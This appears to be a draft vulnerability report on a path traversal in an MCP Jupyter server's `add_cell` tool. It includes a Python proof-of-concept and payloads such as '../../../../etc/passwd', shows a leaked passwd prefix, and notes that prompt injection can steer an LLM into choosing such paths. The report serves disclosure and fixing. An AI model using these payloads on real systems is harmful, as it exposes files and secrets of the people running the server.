# Path traversal in `add_cell`: `notebook_path` opens any file and echoes its first bytes in the error

**Repository:** `ihrpr/mcp-server-jupyter` · **Tool:** `add_cell` · **Tested commit:** `fb44270`
**Weakness:** CWE-22 Path Traversal

## Summary
`add_cell` inserts a cell into the notebook at `notebook_path`. The path is passed straight to `open()` with no allowed root, no `.ipynb` check and no normalisation, so `../../../../etc/passwd` or any absolute path is opened. When the file is not a notebook, the exception text is returned to the caller, and that text contains the start of the file. When the file is a valid notebook anywhere on disk, the tool rewrites it.

## Details
The tool handler passes the argument through unchanged, `src/mcp_server_jupyter/server.py:171-177` and `:200-220`:

```python
    elif name == "add_cell":
        return _add_cell(
            arguments["notebook_path"],
            ...
    try:
        nb_manager = NotebookManager(notebook_path)
        ...
    except Exception as e:
        return [types.TextContent(type="text",
                text=f"An error happened while trying to add a new cell: {str(e)}")]
```

`NotebookManager` opens the path as given, `src/mcp_server_jupyter/notebook_manager.py:12-15`:

```python
    def __init__(self, notebook_path: str) -> None:
        self.notebook_path: str = notebook_path
        with open(notebook_path) as f:
            self.notebook: NotebookNode = nbformat.read(f, as_version=4)
```

If the content is not JSON, `nbformat` raises `NotJSONError` with the message `Notebook does not appear to be JSON: <repr of the file content>`, cut to 80 characters. `_add_cell` returns `str(e)`, so roughly the first 39 characters of the file reach the caller. If the file parses as a notebook, `save_notebook()` (`notebook_manager.py:181-189`) writes it back to the same path. Nothing checks that the path is inside the Jupyter working directory or ends in `.ipynb`. The other tools (`read_notebook_with_outputs`, `read_notebook_source_only`, `read_output_of_cell`, `execute_cell`, `edit_cell`) build `NotebookManager` the same way.

## Steps to reproduce
1. Prerequisites: Python 3.10+, `uv`. No accounts or Jupyter server are needed for this call. Create the target file: `mkdir -p /tmp/tofu-poc && echo marker > /tmp/tofu-poc/outside.txt`.
2. Install and start the server from a checkout as the README's "Git repo fork" setup describes:
   `uv run --directory /path/to/mcp-server-jupyter mcp-server-jupyter`
3. Call the tool with these arguments:

   ```json
   {"notebook_path": "../../../../tmp/tofu-poc/outside.txt", "cell_type": "code", "source": "print('test')", "position": 0}
   ```

   Run the server from a directory at most four levels deep so the `../` chain reaches `/`, or use the absolute path `/tmp/tofu-poc/outside.txt`.

   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(
           command="uv",
           args=["run", "--directory", "/path/to/mcp-server-jupyter", "mcp-server-jupyter"],
       )
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool("add_cell", {
                   "notebook_path": "../../../../tmp/tofu-poc/outside.txt",
                   "cell_type": "code",
                   "source": "print('test')",
                   "position": 0,
               })
               print(result)

   asyncio.run(main())
   ```
4. Observe: the returned text is `An error happened while trying to add a new cell: Notebook does not appear to be JSON: 'marker\n'`. The file outside any notebook directory was opened and its content returned.

## Expected behavior
The tool rejects paths that are not notebooks inside the directory the user works in, and does not return file content in error messages.

## Actual behavior
Any path is opened. In the fuzzing run, `notebook_path` `../../../../etc/passwd` returned:

```
An error happened while trying to add a new cell: Notebook does not appear to be JSON: 'root:x:0:0:root:/root:/bin/bash\ndaemon...
```

## Impact
The LLM chooses `notebook_path`, and prompt injection from content it reads (for example a notebook or web page) can steer that choice. An attacker can read the first few dozen bytes of any file the server user can read, probe for file existence through the different error messages, and modify any existing notebook on disk. The read is short per call, so this is mainly an information leak. Note that the server also offers `execute_cell`, so a caller who can add and run a cell already has code execution in the kernel; this report is about the file tools reaching files the user never pointed them at. If the server runs with the `sse` transport, `server.py:38-47` sets `allow_origins=["*"]`; I did not test whether that lets a web page reach these tools.

## Suggested fix
- Add a configurable root (for example the Jupyter working directory, via an env var or CLI flag). Resolve `notebook_path` with `os.path.realpath` and reject it unless it stays under that root.
- Require the `.ipynb` suffix.
- Return a generic error ("not a valid notebook") instead of `str(e)`, so file content is not echoed.

## Status on the default branch
Still present at `fb44270` (2025-02-01). The default branch has no newer commits than the tested one.

## Prior reports
- #3 "Add cors config to sse server" (PR, closed 2025-01-29): added the SSE CORS setup that this draft mentions as a side remark (`allow_origins=["*"]`); the body only gives a test command and does not discuss path handling or origins. Not a report of this bug.
- Documentation: README.md: "Always use the full path to the notebook when calling tools" (absolute paths anywhere on disk are the documented usage; there is no root directory or `.ipynb` restriction, so a maintainer may see unrestricted paths as intended. The echo of file content in the error is not documented.)

<details>
<summary>Internal notes (remove before filing)</summary>

- ToFu class / sanitizers: path-traversal; `check_path_traversal`, `check_file_access`, `check_introspection_sensitive_file_access` on the evidence calls; the tool also triggered `check_introspection_incomplete_cleanup`, `check_introspection_temp_file_leak`, `check_reflected_output`.
- Campaigns and executions: corpus-sbx 3072/3072 calls returned; e2-0922 1024/1024.
- Evidence (verbatim, trimmed):
  - input `{'notebook_path': '../../../../etc/passwd', 'cell_type': 'code', 'source': "print('test')", 'position': 0}` → `"An error happened while trying to add a new cell: Notebook does not appear to be JSON: 'root:x:0:0:root:/root:/bin/bash\\ndaemon..."`. Tracer: `Access to sensitive file ... Accessed path: '../../../../etc/passwd'`.
  - input `{'notebook_path': '/etc/passwd\x00', ...}` → `embedded null byte` (Python rejects it; still flagged by the tracer).
  - input `{'notebook_path': '..\\..\\..\\..\\windows\\win.ini', ...}` → `[Errno 2] No such file or directory` (Linux host, no effect).
- Hand-check hints: real, low severity. `open()` on an unrestricted caller path is confirmed by code and by the leaked `/etc/passwd` prefix in the log. Caveat: the README tells users to pass full absolute paths, so the maintainer may see "any path" as intended; the stronger point is the content echo in the error and the lack of a `.ipynb`/root check. The 80-character truncation comes from `nbformat.reader.parse_json` (checked in a local nbformat copy, version not pinned to the one the server would install). The write-to-any-notebook claim is from code reading, not observed. The SSE CORS remark is unverified and might deserve its own issue.
</details>
